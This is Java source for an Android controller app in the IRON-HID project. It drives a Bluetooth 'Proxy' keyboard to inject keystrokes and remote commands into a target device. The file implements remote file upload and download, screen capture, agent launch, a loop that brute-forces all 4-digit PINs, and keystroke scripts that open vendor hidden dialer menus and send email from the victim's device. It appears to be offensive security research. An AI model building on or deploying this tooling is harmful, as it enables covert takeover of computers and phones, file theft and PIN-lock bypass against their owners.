/*
           IRON-HID Commander App for the Android Smartphone       
                    Copyright (C) 2016 Seunghun Han 
         at National Security Research Institute of South Korea
*/

/*
Copyright (c) 2016 Seunghun Han at NSR of South Kora

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in
all copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN
THE SOFTWARE.
*/

 
package com.example.commander;

import java.io.*;
import java.util.*;

import android.net.Uri;
import android.os.*;
import android.app.Activity;
import android.bluetooth.*;
import android.content.*;
import android.content.res.*;
import android.util.Log;
import android.view.*;
import android.view.View.OnKeyListener;
import android.widget.*;

/**
 * 	Main activity class
 * 
 * 	Handle view and bluetooth
 */
public class MainActivity extends Activity 
{
	// Variables for bluetooth and thread
	TabHost mTabHost;
	BluetoothAdapter mBluetoothAdapter;
	BluetoothSocket mSocket;
	BluetoothDevice mDevice;
	
	// Handlers for UI update
	static Handler mCommandViewHandler = null;
	static Handler mKeyViewHandler = null;
	static TextView mCommandView = null;
	static TextView mKeyView = null;
	static ScrollView mCommandScrollView = null;
	static ScrollView mKeyScrollView = null;
	static AutoCompleteTextView mCommandInputView = null;
	static AutoCompleteTextView mKeyInputView = null;
	Runnable mCommandScrollPost = null;
	Runnable mKeyScrollPost = null;
	static StringBuffer mCommandBuffer = new StringBuffer(4096);
	static StringBuffer mKeyBuffer = new StringBuffer(4096);
	final static int VIEW_ID_CONTROL = 0;
	final static int VIEW_ID_COMMAND = 1;
	final static int VIEW_ID_KEY = 2;
	int mUpdateCount = 1;
    boolean mStopTest = false;

    final static int CHOOSE_FILE_TO_UPLOAD = 1000;
    String mPutCommand = "";

	CommandManager mCommandManager = null;
	
	@Override
	protected void onCreate(Bundle savedInstanceState)
	{
		super.onCreate(savedInstanceState);
        requestWindowFeature(Window.FEATURE_NO_TITLE);

        setContentView(R.layout.activity_main);
		
		mTabHost = (TabHost)findViewById(R.id.tabHost);
		mTabHost.setup();
        
        TabHost.TabSpec spec;
        
        spec = mTabHost.newTabSpec("Control");
        spec.setIndicator("Control");         
        spec.setContent(R.id.controlView);
        mTabHost.addTab(spec);

        spec = mTabHost.newTabSpec("Command");
        spec.setIndicator("Command");
        spec.setContent(R.id.commandView);
        mTabHost.addTab(spec);        

        spec = mTabHost.newTabSpec("Key");
        spec.setIndicator("Key");
        spec.setContent(R.id.keyView);
        mTabHost.addTab(spec);
        
        mTabHost.setCurrentTab(0);       
        
        // Add Handler & UI view
        AddButtonHandlerToControlView();
        AddUIViewAndHandlers();
	}

	@Override
	public boolean onCreateOptionsMenu(Menu menu) 
	{
		// Inflate the menu; this adds items to the action bar if it is present.
		getMenuInflater().inflate(R.menu.activity_main, menu);
		return true;
	}

	/**
	 *	Handle orient change
	 */
    @Override
    public void onConfigurationChanged(Configuration newConfig) 
    {
    	// TODO Auto-generated method stub
    	super.onConfigurationChanged(newConfig);
    }	
	
	/**
	 *	Add handler to Control view
	 */
	private void AddButtonHandlerToControlView()
	{
		final int FILTER_DARK = 0xA0000000;
		final int FILTER_RESTORE = 0;
		
		View view = mTabHost.getTabContentView().findViewById(R.id.controlView);
		Button connectButton = (Button)view.findViewById(R.id.connect);
		Button disconnectButton = (Button)view.findViewById(R.id.disconnect);
		final TextView textView = (TextView)view.findViewById(R.id.state);
		final ImageView imageView = (ImageView)view.findViewById(R.id.image);
		imageView.setColorFilter(FILTER_DARK);
		
		textView.setText("Disconnected");
		
		// Add button handler
		connectButton.setOnClickListener(new View.OnClickListener()
		{				
			@Override
			public void onClick(View arg0)
			{
				try
				{
					// Find & connect to keyboard's bluetooth serial
					if (FindKeyboard() == false)
					{
						return ;
					}
					
					if (ConnectKeyboard() == false)
					{							
						return ;
					}

					ShowToast("Proxy Keyboard Connect Success");
					
					textView.setText("Connected");
					imageView.setColorFilter(FILTER_RESTORE);
				}
				catch (IOException ex)					
				{
					ShowToast("Proxy Keyboard Connect Fail");

					textView.setText("Disconnected");
					imageView.setColorFilter(FILTER_DARK);
				}
			}
		});
		
		// Add button handler
		disconnectButton.setOnClickListener(new View.OnClickListener()
		{				
			@Override
			public void onClick(View arg0) 
			{
				textView.setText("Disconnected");
				imageView.setColorFilter(FILTER_DARK);
				
				try
				{
					DisconnectKeyboard();
				}
				catch (IOException ex)
				{
					
				}
			}
		});		
	}

	/**
	 *	Make view's handler
	 *	Show all views' message via this handler 
	 */
	private Handler MakeViewHandler(int viewID)
	{
		Handler handler = new Handler() 
		{
			@Override
			public void handleMessage(Message msg)
			{
				// Get data from msg
				String data = (String) msg.obj;
				final TextView textView;
				final StringBuffer buffer;
				final ScrollView scrollView;
				final AutoCompleteTextView autoCompleteText;
				Runnable scrollPost = null;
				int delayTime = 0;
				
				// Set view pointer
				if (msg.what == VIEW_ID_COMMAND)
				{
					textView = mCommandView;
					buffer = mCommandBuffer;
					scrollView = mCommandScrollView;
					scrollPost = mCommandScrollPost;
					if ((mUpdateCount % 20) == 0)
					{
						delayTime = 0;
					}
					else
					{
						delayTime = 1000;
					}
					mUpdateCount++;
				}
				else
				{
					textView = mKeyView;
					buffer = mKeyBuffer;
					scrollView = mKeyScrollView;
					scrollPost = mKeyScrollPost;
					delayTime = 0;
				}

				if (mTabHost.getCurrentTab() == VIEW_ID_COMMAND)
				{
					autoCompleteText = mCommandInputView;
				}
				else
				{
					autoCompleteText = mKeyInputView;
				}

				
				// Update data
				buffer.append(data);
				if (buffer.length() > 5000)
				{
					buffer.delete(0, buffer.length() - 5000);
				}
				
				removeCallbacks(scrollPost);

				// Reduce update frequency
				scrollPost = new Runnable() 
				{
					@Override
					public void run() 
					{
						textView.setText(buffer);
						
						postDelayed(new Runnable()
						{
							@Override
							public void run() 
							{
								scrollView.fullScroll(View.FOCUS_DOWN);
								autoCompleteText.requestFocus();
							}
						}, 200);
					}
				};
				
				if (msg.what == VIEW_ID_COMMAND)
				{
					mCommandScrollPost = scrollPost;
				}
				else
				{
					mKeyScrollPost = scrollPost;
				}
				
				postDelayed(scrollPost, delayTime);
			}
		};
		
		return handler;
	}	
	
	/**
	 *	Make for UI handler
	 */
	private void AddUIViewAndHandlers()
	{
		// Set view and autocomplete text		
		SetViewAndAutoCompleteText(VIEW_ID_COMMAND);
		SetViewAndAutoCompleteText(VIEW_ID_KEY);
		
		// Set handler
		mCommandViewHandler = MakeViewHandler(VIEW_ID_COMMAND);		
		mKeyViewHandler = MakeViewHandler(VIEW_ID_KEY);
	}
	
	/**
	 *	Set views and autocompletetext 
	 */
	private void SetViewAndAutoCompleteText(int viewID)
	{
		// Auto complete words
        // !put, !get, !capture, !launch, !autotest are special commands
		final String [] COMMAND_LIST = new String [] { 
				"!put a.txt", "!get c:/test.txt", "!capture 1.jpg", "!launch", 
				"dir", "cd ", "cd ..", "c:", "tasklist" };
		final String [] KEY_LIST = new String [] { 
				"!autotest", "!pintest", "!stoptest", "[KEY_", "[KEY_LGUI]", "[KEY_LGUI][KEY_R]", "[KEY_LGUI][KEY_L]", "[KEY_LALT]", "[KEY_LALT][KEY_F4]", "[KEY_LCONTROL]", "[KEY_LCONTROL][KEY_S]", "[KEY_UP]",
				"[KEY_LSHIFT]",	"[KEY_ENTER]", "[KEY_BACKSPACE]", "cmd.exe", "d:/testagent" };
		
		// Set view pointer
		View view;
		AutoCompleteTextView autoText;
		ArrayAdapter<String> adapter;
		
		// Set view pointer
		if (viewID == VIEW_ID_COMMAND)
		{
			view = mTabHost.getTabContentView().findViewById(R.id.commandView);
			mCommandView = (TextView)view.findViewById(R.id.dataview);
			mCommandScrollView = (ScrollView)view.findViewById(R.id.scrollview);
			mCommandInputView = (AutoCompleteTextView) view.findViewById(R.id.commandInput);
			autoText = mCommandInputView;
			adapter = new ArrayAdapter(getApplicationContext(), 
					android.R.layout.simple_dropdown_item_1line, COMMAND_LIST);
		}
		else
		{
			view = mTabHost.getTabContentView().findViewById(R.id.keyView);
			mKeyView = (TextView)view.findViewById(R.id.dataview);
			mKeyScrollView = (ScrollView)view.findViewById(R.id.scrollview);
			mKeyInputView = (AutoCompleteTextView) view.findViewById(R.id.keyInput);
			autoText = mKeyInputView;
			adapter = new ArrayAdapter(getApplicationContext(), 
					android.R.layout.simple_dropdown_item_1line, KEY_LIST);			
		}		
		
		// Set options for autocomplete
		autoText.setTag(viewID);
		autoText.setAdapter(adapter);
		autoText.setThreshold(1);
		
		// Process enter key
		autoText.setOnKeyListener(new OnKeyListener()
		{
			@Override
			public boolean onKey(View arg0, int arg1, KeyEvent arg2) 
			{				
				if ((arg0 != null) && (arg2 != null) && 
					(arg2.getAction() == KeyEvent.ACTION_DOWN) &&
					(arg2.getKeyCode() == KeyEvent.KEYCODE_ENTER))
				{
					AutoCompleteTextView view = (AutoCompleteTextView) arg0;
					String data;
					int viewID;
					
					data = view.getText().toString();
                    view.setText("");
                    viewID = (Integer) view.getTag();
                    if (data.equals("") == true)
                    {
                        if (viewID == VIEW_ID_KEY)
                        {
                            data = "[KEY_ENTER]";
                        }
                        else
                        {
                            return true;
                        }
                    }

                    SendCommandOrKeys(viewID, data);

					return true;
				}
				return false;
			}
		});		
	}
	
	/**
	 * 	Show toast message
	 */
	public void ShowToast(String message)
	{
		Toast toast = Toast.makeText(getApplicationContext(), message, 
			Toast.LENGTH_LONG);
		toast.setGravity(Gravity.CENTER, 0, 0);
		toast.show();
	}
	
	/**
	 * 	Add message to command view
	 */
	public void AddMsgToCommandView(int viewID, String message)
	{
		Message msg = mCommandViewHandler.obtainMessage(viewID, message);
		mCommandViewHandler.sendMessage(msg);
	}
	
	/**
	 * 	Add message to key view
	 */
	public void AddMsgToKeyView(int viewID, String message)
	{
		Message msg = mKeyViewHandler.obtainMessage(viewID, message);
		mKeyViewHandler.sendMessage(msg);
	}

	/**
	 *	Send commands or keys from autocomplete textview 
	 */
	private void SendCommandOrKeys(int viewID, String data)
	{
		if (mCommandManager == null)
		{
			return ;
		}
		
		if (viewID == VIEW_ID_COMMAND)
		{
            // In put case, select file
            if (data.contains("!put"))
            {
                Intent intent = new Intent(Intent.ACTION_GET_CONTENT);
                intent.setType("*/*");
                intent.addCategory(Intent.CATEGORY_OPENABLE);
                mPutCommand = data;

                try
                {
                    startActivityForResult(Intent.createChooser(intent, 
						"Select a File"), CHOOSE_FILE_TO_UPLOAD);
                } catch (android.content.ActivityNotFoundException ex)
                {
                    ex.printStackTrace();
                }

                return ;
            }

			mCommandManager.SendCommand(data);
		}
		else
		{
			AddMsgToKeyView(viewID, "remote> " + data + "\n");

            if (data.equals("!autotest"))
            {
                // Run android autotest
                AddMsgToKeyView(viewID, "remote> wait until the test ends\n");
                RunAutoTest();
            }
            else if (data.equals("!pintest"))
            {
                // Run android autotest
                AddMsgToKeyView(viewID, "remote> wait until the test ends\n");
                RunPinTest();
            }
            else if (data.equals("!stoptest"))
            {
                mStopTest = true;
            }
            else
            {
                mCommandManager.SendKey(data);
            }
		}		
	}

    /**
     *	Run automatic test
     */
    private void RunAutoTest()
    {
        Log.d("IRON-HID", "Start AutoTest");
        mStopTest = false;
        Runnable runnable = new Runnable()
            {

                public void SendKeysInArray(List<String> list)
                {
                    // Email loop
                    for (String key : list)
                    {
                        SendCommandOrKeys(VIEW_ID_KEY, key);
                        if (mStopTest == true)
                        {
                            return ;
                        }

                        try
                        {
                            Thread.sleep(1500);
                        }
                        catch(Exception e)
                        {

                        }
                    }
                }

            @Override
                public void run()
                {
                    ////////////////////////////////////////////////////////////////////////////////
                    // Open call tab
                    ////////////////////////////////////////////////////////////////////////////////
                    List <String> keyPrepareList = new ArrayList<String>();
                    keyPrepareList.add("[KEY_LGUI][KEY_C]"); // Open contect
                    keyPrepareList.add("[KEY_TAB]"); // Move phone call tab
                    keyPrepareList.add("[KEY_ENTER]"); // Select Menu

                    SendKeysInArray(keyPrepareList);

                    if (mStopTest == true)
                    {
                        return ;
                    }

                    ////////////////////////////////////////////////////////////////////////////////
                    //  Send hidden menu command
                    ////////////////////////////////////////////////////////////////////////////////
                    List <String> keyInputList = new ArrayList<String>();
                    keyInputList.add("*#*#4636#*#*");   // Android common command for hidden menu
                    keyInputList.add("[KEY_ESC]");
                    keyInputList.add("[KEY_ENTER]");
                    keyInputList.add("##7764726");      // Motoloa command for hidden menu
                    keyInputList.add("[KEY_ESC]");
                    keyInputList.add("[KEY_ENTER]");
                    keyInputList.add("*#*#1234#*#*");   // HTC command for hidden menu
                    keyInputList.add("[KEY_ESC]");
                    keyInputList.add("[KEY_ENTER]");
                    keyInputList.add("3845#*855#");     // LG command for hidden menu
                    keyInputList.add("[KEY_ESC]");
                    keyInputList.add("[KEY_ENTER]");
                    keyInputList.add("5689#*990#");     // LG command for hidden menu
                    keyInputList.add("[KEY_ESC]");
                    keyInputList.add("[KEY_ENTER]");
                    keyInputList.add("319712358");      // Samsung command for hidden menu (2 Step)
                    keyInputList.add("774632");
                    keyInputList.add("[KEY_ENTER]");
                    keyInputList.add("[KEY_ESC]");
                    keyInputList.add("[KEY_ENTER]");
                    keyInputList.add("319712358");      // Samsung command for hidden menu (2 Step)
                    keyInputList.add("0821");
                    keyInputList.add("[KEY_ENTER]");
                    keyInputList.add("[KEY_ESC]");
                    keyInputList.add("[KEY_ENTER]");
                    keyInputList.add("319712358");      // Samsung command for hidden menu (2 Step)
                    keyInputList.add("996412");
                    keyInputList.add("[KEY_ENTER]");
                    keyInputList.add("[KEY_ESC]");

                    SendKeysInArray(keyInputList);
                    if (mStopTest == true)
                    {
                        return ;
                    }

                    ////////////////////////////////////////////////////////////////////////////////
                    // Send email to me
                    ////////////////////////////////////////////////////////////////////////////////
                    List <String> keyEmailList = new ArrayList<String>();
                    keyEmailList.add("[KEY_LGUI][KEY_E]");  // Open email
                    keyEmailList.add("[KEY_TAB]");          // Move new email tab
                    keyEmailList.add("[KEY_TAB]");          // Move new email tab
                    keyEmailList.add("[KEY_ENTER]");        // Select Menu
                    keyEmailList.add("iron.hid.project@gmail.com"); // To
                    keyEmailList.add("[KEY_ENTER]");
                    keyEmailList.add("[KEY_TAB]");
                    keyEmailList.add("Automatic test is ended");    // Title
                    keyEmailList.add("[KEY_ENTER]");
                    keyEmailList.add("This email is sent from PowerShock (a.k.a IRON-HID)");    // Content
                    keyEmailList.add("[KEY_TAB]");          // Move to send button
                    keyEmailList.add("[KEY_TAB]");
                    keyEmailList.add("[KEY_ENTER]");
                    keyEmailList.add("[KEY_TAB]");          // Move to OK
                    keyEmailList.add("[KEY_ENTER]");

                    SendKeysInArray(keyEmailList);

                    AddMsgToKeyView(VIEW_ID_KEY, "remote> auto test is ended\n");
                    if (mStopTest == true)
                    {
                        return ;
                    }
                }
            };;

        //new Handler().post(runnable);
        new Thread(runnable).start();
    }

    /**
     *	Run automatic PIN test
     */
    private void RunPinTest()
    {
        Log.d("IRON-HID", "Start AutoTest");
        mStopTest = false;
        Runnable runnable = new Runnable()
        {
            @Override
            public void run()
            {
                for (int i = 0 ; i < 10000 ; i ++)
                {
                    String data = String.format("%04d", i);
                    SendCommandOrKeys(VIEW_ID_KEY, data);
                    SendCommandOrKeys(VIEW_ID_KEY, "[KEY_ENTER]");
                    if (mStopTest == true)
                    {
                        return ;
                    }

                    try
                    {
                        Thread.sleep(10);
                    }
                    catch(Exception e)
                    {

                    }
                }

                AddMsgToKeyView(VIEW_ID_KEY, "remote> auto PIN test is ended\n");
            }
        };;

        //new Handler().post(runnable);
        new Thread(runnable).start();
    }

	/**
	 *	Find keyboard by Name
	 */
	private boolean FindKeyboard()
	{
		mBluetoothAdapter = BluetoothAdapter.getDefaultAdapter();
		if ((mBluetoothAdapter == null) || (mBluetoothAdapter.isEnabled() == false))
		{
			Intent intent = new Intent(BluetoothAdapter.ACTION_REQUEST_ENABLE);
			startActivityForResult(intent, 0);
		}
		
		Set<BluetoothDevice> pairedDevice = mBluetoothAdapter.getBondedDevices();
		if (pairedDevice.size() > 0)
		{
			for (BluetoothDevice device : pairedDevice)
			{
				if (device.getName().equals("Proxy"))
				{
					mDevice = device;
					break;
				}
			}
		}
		
		if (mDevice == null)
		{
			return false;
		}
		return true;
	}
	
	/**
	 * 	Connect to keyboard's bluetooth serial
	 * 
	 *	@throws IOException
	 */
	private boolean ConnectKeyboard() throws IOException
	{
		// Standard Serial Port Service ID
		UUID uuid = UUID.fromString("00001101-0000-1000-8000-00805F9B34FB");			
		
		mSocket = mDevice.createRfcommSocketToServiceRecord(uuid);
		mSocket.connect();
		
		if (mCommandManager != null)
		{
			ShowToast("Already connected");
			return false;
		}
		
		mCommandManager = new CommandManager(this, mSocket);
		return true;
	}
	
	/**
	 * 	Disconnect bluetooth serial connection
	 * 
	 * 	@throws IOException
	 */
	private void DisconnectKeyboard() throws IOException
	{
		// Thread stop
		if (mCommandManager != null)
		{
			mCommandManager.Finalize();
			mCommandManager = null;
		}
		
		if (mSocket != null)
		{
			mSocket.close();
		}
		
		if (mDevice != null)
		{
			mDevice = null;
		}
		
	}

    /**
     *  Process file select result
     */
    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data)
    {
        //"/storage/emulated/0/IRON-HID/captures" <== can open~!!
        //"file:///mnt/sdcard/Download/20141025_170314.jpg"
        if (requestCode == CHOOSE_FILE_TO_UPLOAD)
        {
            if (resultCode == RESULT_OK)
            {
                Uri uri = data.getData();
                if (uri != null)
                {
                    // Send file
                    String filePath = uri.getPath();
                    filePath = filePath.replace("file://", "");
                    mPutCommand += " " + filePath;
                    mCommandManager.SendCommand(mPutCommand);
                }
            }
        }

        super.onActivityResult(requestCode, resultCode, data);
    }
}
